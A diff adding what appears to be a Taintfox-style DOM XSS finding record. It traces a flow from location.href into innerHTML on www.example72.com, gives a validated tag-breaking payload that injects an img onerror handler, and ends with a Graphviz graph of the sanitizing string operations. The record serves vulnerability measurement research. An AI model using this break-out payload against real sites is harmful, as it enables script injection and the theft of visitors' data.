@@ -1,0 +1,119 @@
+// Finding: 95bb8011-6f51-4ebb-b400-4c5c75da62da
+// Finding.url: https://www.example72.com/coronavirus/##</iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('8c246a6b128449849697d8d0ab2ef6db')><!--/*
+// Finding.parentloc: https://www.example72.com/coronavirus/##</iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('8c246a6b128449849697d8d0ab2ef6db')><!--/*
+// Finding.domain: www.example72.com
+// Finding.base_domain: example72.com
+// Finding.source: location.href
+// Finding.sink: innerHTML
+// Sanitizer.score: 1
+// Sanitizer.name: 
+// Sanitizer.location: https://www.example72.com/coronavirus/##</iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('8c246a6b128449849697d8d0ab2ef6db')><!--/* - <anonymous>:1069:15
+// Finding.begin: 357
+// Finding.end: 434
+// Finding.original_uuid: 0fc8f7df-5168-44ed-84f7-96374a8afc52
+// Finding.TwentyFiveMillionFlowsId: 420132770
+// Finding.script: https://www.example72.com/assets/javascript/jquery-3.4.1.min.js
+// Finding.line: 2
+// Exploit.uuid: 8c246a6b-1284-4984-9697-d8d0ab2ef6db
+// Exploit.success: true
+// Exploit.status: validated
+// Exploit.method: C
+// Exploit.type: html
+// Exploit.token: text
+// Exploit.content: C
+// Exploit.quote_type: None
+// Exploit.tag: None
+// Exploit.break_out: #</iframe></style></script></object></embed></textarea><img src=x onerror=
+// Exploit.break_in: ><!--/*
+// Exploit.payload: #</iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog(1)><!--/*
+// Exploit.begin_taint_url: 15
+// Exploit.end_taint_url: 16
+// Exploit.replace_begin_url: 33
+// Exploit.replace_end_url: 33
+// Exploit.replace_begin_param: 160
+// Exploit.replace_end_param: 160
+// Issues.LargestEncodeAttrStringChain: 0
+// Issues.LargestTextFragmentEncodeChainLength: 0
+// Issues.HasApproximation: false
+// Issues.HasMissingImplementation: false
+// Issues.HasInfiniteRegexWithFunctionReplacer: false
+// Issues.MergedSplitAndJoins: false
+// Issues.HasUrlInRhsOfReplace: false
+// Issues.HasUrlInLhsOfReplace: false
+// Issues.HasCookieValueInLhsOfreplace: false
+// Issues.HasCookieValueInRhsOfreplace: false
+// Issues.HasCookieValueInMatchPattern: false
+// Issues.HasCookieValueInExecPattern: false
+// Issues.RemovedLRConcats: true
+// Issues.RemovedReplaceArtifacts: false
+// Issues.HasUrlInMatchPattern: false
+// Issues.HasUrlInExecPattern: false
+// Issues.RemovedNOPreplaces: false
+// Issues.Known_sanitizer: false
+// DepGraph.hash: 442146017
+// DepGraph.sanitizer_hash: -715280327
+// Removed LR concats 
+// Removed LR concats 
+digraph cfg {
+n0 [shape=house, label="Input: x"];
+n1 [shape=ellipse, label="str_replace_once"];
+n2 [shape=box, label="RegExp: /(\?.*)$/"];
+n3 [shape=box, label="Lit: "];
+n4 [shape=box, label="Var: x"];
+n5 [shape=ellipse, label="split"];
+n6 [shape=box, label="Lit: /"];
+n7 [shape=box, label="Var: x"];
+n8 [shape=ellipse, label="substr"];
+n9 [shape=box, label="Var: x"];
+n10 [shape=box, label="Lit: 1"];
+n11 [shape=ellipse, label="str_replace_once"];
+n12 [shape=box, label="RegExp: /\.(htm[l]?|asp[x]?|php|jsp)$/"];
+n13 [shape=box, label="Lit:  "];
+n14 [shape=box, label="Var: x"];
+n15 [shape=ellipse, label="str_replace_once"];
+n16 [shape=box, label="RegExp: /\.(htm[l]?|asp[x]?|php|jsp)$/"];
+n17 [shape=box, label="Lit:  "];
+n18 [shape=box, label="Var: x"];
+n19 [shape=ellipse, label="."];
+n20 [shape=box, label="Lit:  "];
+n21 [shape=ellipse, label="."];
+n22 [shape=box, label="Lit:  "];
+n23 [shape=ellipse, label="preg_replace"];
+n24 [shape=box, label="RegExp: /[-]/"];
+n25 [shape=box, label="Lit:  "];
+n26 [shape=box, label="Var: x"];
+n27 [shape=ellipse, label="."];
+n28 [shape=box, label="Lit: </a></li>"];
+n29 [shape=box, label="Var: x"];
+n30 [shape=doubleoctagon, label="Return: x"];
+n4 -> n0;
+n1 -> n2;
+n1 -> n3;
+n1 -> n4;
+n7 -> n1;
+n5 -> n6;
+n5 -> n7;
+n9 -> n5;
+n8 -> n9;
+n8 -> n10;
+n14 -> n8;
+n11 -> n12;
+n11 -> n13;
+n11 -> n14;
+n18 -> n11;
+n15 -> n16;
+n15 -> n17;
+n15 -> n18;
+n19 -> n15;
+n19 -> n20;
+n21 -> n19;
+n21 -> n22;
+n26 -> n21;
+n23 -> n24;
+n23 -> n25;
+n23 -> n26;
+n27 -> n23;
+n27 -> n28;
+n29 -> n27;
+n30 -> n29;
+}
